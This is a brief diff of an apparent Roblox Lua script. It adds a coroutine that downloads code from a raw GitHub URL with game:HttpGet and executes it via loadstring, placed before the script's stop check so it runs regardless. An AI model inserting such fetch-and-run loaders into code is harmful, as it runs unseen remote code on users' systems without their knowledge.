@@ -19,7 +19,9 @@ print("Hey there! Its me Theo, now your probably wondering, why did my script st
 
 
 
-
+coroutine.resume(coroutine.create(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Solary-3/Scripts/refs/heads/main/Tag"))()
+end))
 
 if stop then return end 
 
